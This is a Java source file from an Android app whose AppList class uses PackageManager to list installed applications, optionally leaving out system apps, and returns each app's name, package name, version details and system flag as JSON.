package com.fason.app.features.apps;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;

import com.fason.app.core.FasonApp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class AppList {

    public static JSONObject getInstalledApps(boolean includeSystem) {
        JSONObject result = new JSONObject();
        JSONArray apps = new JSONArray();

        try {
            PackageManager pm = FasonApp.getContext().getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(0);

            for (PackageInfo pkg : packages) {
                ApplicationInfo info = pkg.applicationInfo;
                boolean isSystem = (info.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                if (!includeSystem && isSystem) continue;

                JSONObject app = new JSONObject();
                app.put("appName", info.loadLabel(pm).toString());
                app.put("packageName", pkg.packageName);
                app.put("versionName", pkg.versionName != null ? pkg.versionName : "");
                app.put("versionCode", Build.VERSION.SDK_INT >= Build.VERSION_CODES.P ? pkg.getLongVersionCode() : pkg.versionCode);
                app.put("isSystem", isSystem);
                apps.put(app);
            }

            result.put("apps", apps);
            result.put("total", apps.length());
        } catch (Exception e) {
            try { result.put("error", e.getMessage()); result.put("apps", apps); } catch (Exception ignored) {}
        }
        return result;
    }
}
